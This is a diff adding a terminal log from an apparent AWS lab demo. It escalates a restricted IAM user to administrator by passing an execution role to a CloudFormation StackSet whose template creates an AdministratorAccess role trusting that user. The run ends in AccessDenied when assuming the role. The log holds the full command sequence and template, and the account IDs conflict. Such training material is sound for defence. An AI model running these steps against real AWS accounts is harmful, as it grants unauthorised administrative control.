@@ -1,0 +1,125 @@
+[0;32m========================================[0m
+[0;32mIAM PassRole + CloudFormation StackSet Privilege Escalation Demo[0m
+[0;32m========================================[0m
+
+[1;33mStep 1: Retrieving scenario configuration from Terraform[0m
+Retrieved access key for: pl-prod-cloudformation-003-to-admin-starting-user
+Access Key ID: AKIA2E4JP2...
+ReadOnly Key ID: AKIA2E4JP2...
+Region: us-east-1
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[1;33m[demo_permissions] Restricting helpful permissions for validation...[0m
+  Denied helpful permissions on user: pl-prod-cloudformation-003-to-admin-starting-user
+[1;33m[demo_permissions] Waiting 15s for IAM policy propagation...[0m
+[0;32m[demo_permissions] Helpful permissions restricted[0m
+[1;33mStep 2: Verifying starting user identity[0m
+Using region: us-east-1
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-cloudformation-003-to-admin-starting-user
+[0;32m✓ Verified starting user identity[0m
+
+[1;33mStep 3: Getting account ID[0m
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Retrieved account ID[0m
+
+[1;33mStep 4: Verifying we don't have admin permissions yet[0m
+Attempting to list IAM users (should fail)...
+[2m[Attacker] $ aws iam list-users --max-items 1[0m
+[0;32m✓ Confirmed: Cannot list IAM users (as expected)[0m
+
+[1;33mStep 5: Creating CloudFormation StackSet template for privilege escalation[0m
+This template will create a new IAM role with admin permissions that trusts our user...
+Template created at: /tmp/cfn-stackset-escalation-template.yaml
+
+[0;34mTemplate contents:[0m
+AWSTemplateFormatVersion: '2010-09-09'
+Description: 'Privilege Escalation - Creates an admin role that trusts the starting user via StackSet'
+
+Resources:
+  EscalatedRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: pl-prod-cloudformation-003-to-admin-escalated-role
+      Description: 'Escalated role with admin permissions - created via CloudFormation StackSet PassRole attack'
+      AssumeRolePolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+          - Effect: Allow
+            Principal:
+              AWS: arn:aws:iam::123456789012:user/pl-prod-cloudformation-003-to-admin-starting-user
+            Action: sts:AssumeRole
+      ManagedPolicyArns:
+        - arn:aws:iam::aws:policy/AdministratorAccess
+
+Outputs:
+  EscalatedRoleArn:
+    Description: ARN of the escalated admin role
+    Value: !GetAtt EscalatedRole.Arn
+  EscalatedRoleName:
+    Description: Name of the escalated admin role
+    Value: !Ref EscalatedRole
+
+[0;32m✓ CloudFormation StackSet template created[0m
+
+[1;33mStep 6: Creating CloudFormation StackSet with execution role[0m
+This is the privilege escalation vector - passing the execution role to CloudFormation StackSet...
+Execution role ARN: arn:aws:iam::123456789012:role/pl-prod-cloudformation-003-to-admin-execution-role
+Administration role ARN: arn:aws:iam::123456789012:role/pl-prod-cloudformation-003-to-admin-admin-role
+StackSet name: pl-prod-cloudformation-003-escalation-stackset
+
+
+[0;36m[Attacker] $ aws cloudformation create-stack-set --region us-east-1 --stack-set-name pl-prod-cloudformation-003-escalation-stackset --template-body file:///tmp/cfn-stackset-escalation-template.yaml --administration-role-arn arn:aws:iam::123456789012:role/pl-prod-cloudformation-003-to-admin-admin-role --execution-role-name pl-prod-cloudformation-003-to-admin-execution-role --capabilities CAPABILITY_NAMED_IAM --output text[0m
+pl-prod-cloudformation-003-escalation-stackset:306e03f0-c487-422c-b22f-e6f52012f84a
+[0;32m✓ CloudFormation StackSet creation initiated[0m
+
+[1;33mStep 7: Creating stack instances in current account and region[0m
+Deploying StackSet to account: 697683661464, region: us-east-1
+
+
+[0;36m[Attacker] $ aws cloudformation create-stack-instances --region us-east-1 --stack-set-name pl-prod-cloudformation-003-escalation-stackset --accounts 697683661464 --regions us-east-1 --operation-preferences FailureToleranceCount=0,MaxConcurrentCount=1 --query 'OperationId' --output text[0m
+Operation ID: 0c98c538-c263-4a4b-a187-99c6961292b1
+[0;32m✓ Stack instance creation initiated[0m
+
+[1;33mStep 8: Waiting for StackSet operation to complete[0m
+This may take 30-60 seconds...
+
+[2m[ReadOnly] $ aws cloudformation describe-stack-set-operation --region us-east-1 --stack-set-name pl-prod-cloudformation-003-escalation-stackset --operation-id 0c98c538-c263-4a4b-a187-99c6961292b1 --query 'StackSetOperation.Status' --output text[0m
+Operation status: RUNNING
+[2m[ReadOnly] $ aws cloudformation describe-stack-set-operation --region us-east-1 --stack-set-name pl-prod-cloudformation-003-escalation-stackset --operation-id 0c98c538-c263-4a4b-a187-99c6961292b1 --query 'StackSetOperation.Status' --output text[0m
+Operation status: RUNNING
+[2m[ReadOnly] $ aws cloudformation describe-stack-set-operation --region us-east-1 --stack-set-name pl-prod-cloudformation-003-escalation-stackset --operation-id 0c98c538-c263-4a4b-a187-99c6961292b1 --query 'StackSetOperation.Status' --output text[0m
+Operation status: RUNNING
+[2m[ReadOnly] $ aws cloudformation describe-stack-set-operation --region us-east-1 --stack-set-name pl-prod-cloudformation-003-escalation-stackset --operation-id 0c98c538-c263-4a4b-a187-99c6961292b1 --query 'StackSetOperation.Status' --output text[0m
+Operation status: SUCCEEDED
+[0;32m✓ StackSet operation complete![0m
+
+[1;33mStep 9: Waiting for IAM propagation[0m
+Waiting 15 seconds for the escalated role to be fully available...
+[0;32m✓ IAM propagation complete[0m
+
+[1;33mStep 10: Assuming the escalated admin role[0m
+This role was created by CloudFormation StackSet and has administrator access...
+Role ARN: arn:aws:iam::123456789012:role/pl-prod-cloudformation-003-to-admin-escalated-role
+
+
+[0;36m[Attacker] $ aws sts assume-role --role-arn arn:aws:iam::123456789012:role/pl-prod-cloudformation-003-to-admin-escalated-role --role-session-name escalation-demo --query 'Credentials' --output json[0m
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: 
+[0;32m✓ Successfully assumed escalated role[0m
+
+[1;33mStep 11: Verifying administrator access[0m
+Attempting to list IAM users...
+
+[2m[ReadOnly] $ aws iam list-users --max-items 3 --output table[0m
+[0;31m✗ Failed to list users[0m
+
+[1;33m[demo_permissions] Script interrupted, restoring permissions...[0m
+[1;33m[demo_permissions] Restoring helpful permissions...[0m
+  Restored user: pl-prod-cloudformation-003-to-admin-starting-user
+[0;32m[demo_permissions] Helpful permissions restored[0m
+
+An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:iam::123456789012:user/pl-prod-cloudformation-003-to-admin-starting-user is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::123456789012:role/pl-prod-cloudformation-003-to-admin-escalated-role
+Unable to locate credentials. You can configure credentials by running "aws configure".
+Unable to locate credentials. You can configure credentials by running "aws configure".
